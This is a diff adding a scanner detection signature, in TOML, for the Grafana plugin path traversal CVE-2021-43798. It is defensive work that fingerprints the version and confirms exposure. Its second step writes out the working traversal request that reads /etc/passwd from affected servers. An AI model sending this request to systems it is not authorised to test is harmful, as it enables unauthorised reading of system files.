@@ -1,0 +1,58 @@
+# Grafana plugin path traversal (CVE-2021-43798) — a Tier-1 flow with a
+# *conditional* second step, the shape a version→CVE check takes. Step one
+# identifies Grafana and binds its version, continuing even when the banner is
+# quiet; step two runs only against an affected version and attempts the
+# traversal to confirm, so a patched server is never probed for the exploit.
+#
+# The `Host:` header is a fixed `localhost`, as the signature corpus sends it.
+# Seeding the scanned host as a `{target}` variable is a separate, deferred
+# decision; until it lands a flow names the host it already reached, not one it
+# chooses.
+
+[detection]
+id      = "grafana-path-traversal"
+version = "1.0.0"
+title   = "Grafana plugin path traversal (CVE-2021-43798)"
+
+[detection.when]
+service  = "http"
+protocol = "tcp"
+
+[detection.capabilities]
+class           = "active-benign"   # reads a file the app should not expose; changes nothing
+speak           = "target"
+max_bytes       = 65536
+max_millis      = 4000
+max_connections = 2
+
+[[step]]                        # identify Grafana + version; no gate, so the flow continues
+send        = "GET /login HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\n\r\n"
+bind        = { version = "Grafana v(?<version>[0-9.]+)" }
+on_no_match = "continue"
+
+[[step]]                        # conditional: only attempt against an affected version (< 8.3.1)
+when        = "bound(version) and version < '8.3.1'"
+send        = "GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\n\r\n"
+expect      = 'root:.*:0:0:'                            # a real /etc/passwd line — confirmation
+on_no_match = "continue"
+
+  [[step.finding]]
+  when         = "matched"
+  severity     = "critical"
+  confidence   = "certain"
+  summary      = "Grafana is vulnerable to unauthenticated path traversal"
+  detail       = "Grafana {version} disclosed /etc/passwd via the plugin path (CVE-2021-43798)."
+  references   = [
+    { cve = "CVE-2021-43798" },
+    { cwe = 22 },
+    { url = "https://grafana.com/security/security-advisories/cve-2021-43798/" },
+  ]
+  remediation  = "Upgrade to Grafana 8.3.1 or later."
+  excerpt_from = "$response"                            # the leaked passwd bytes
+
+  [[step.finding]]              # a version match without a confirmed leak is still worth a note
+  when       = "not matched and bound(version)"
+  severity   = "medium"
+  summary    = "Grafana version is in the affected range but the leak did not confirm"
+  detail     = "Grafana {version} is < 8.3.1 (CVE-2021-43798) but the probe did not read a file."
+  references = [{ cve = "CVE-2021-43798" }]
